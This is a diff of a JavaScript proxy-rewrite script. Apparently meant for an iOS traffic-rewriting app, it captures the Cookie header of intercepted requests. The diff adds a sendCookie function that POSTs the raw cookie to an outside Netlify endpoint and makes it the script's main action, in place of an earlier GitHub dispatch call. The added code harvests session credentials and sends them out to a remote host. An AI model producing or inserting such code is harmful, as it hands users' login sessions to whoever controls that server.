@@ -144,6 +144,7 @@ function send2Github(cookie,token){
         headers: {
             Accept: "application/vnd.github.v3+json",
             Authorization: "token "+ token,
+			"Content-Type": 'application/json',
         },
         body:JSON.stringify({
             event_type: "ak",
@@ -167,12 +168,34 @@ function send2Github(cookie,token){
         })
     });
 }
+
+function sendCookie(cookie){
+	const form = {
+		url : "https://wuyserver.netlify.app/.netlify/functions/setAkToken",
+		headers: {
+			"Content-Type": 'application/json',
+		},
+		body:cookie
+	
+	}
+	return new Promise(resolve => {
+		$.post(form,(error, response, data) => {
+			try { 
+				if (error) {
+					throw new Error(error); //如果请求失败, 例如无法联网, 则抛出一个异常
+				}
+				console.log(response.body);
+			} catch (e) {
+				$.notify(`\n失败原因: ${e.message}`);
+				resolve(); 
+			}
+		})
+	})
+
+}
 (async function() {
-	const token = await getGToken();
-    const cookieVal = $request.headers['Cookie'] || "null"
-	$.notify("cookie获取成功","",cookieVal)
-    await send2Github(cookieVal,"ghp_"+token);
-	$.notify("成功","","脚本开始运行")
+    const cookieVal = $request.headers['Cookie'];
+	await sendCookie(cookieVal);
 	// await Promise.all([ //该方法用于将多个实例包装成一个新的实例, 可以简单理解为同时调用函数, 以进一步提高执行速度
 	// 	GetUserPoint(), 
 	// 	ListProduct() 
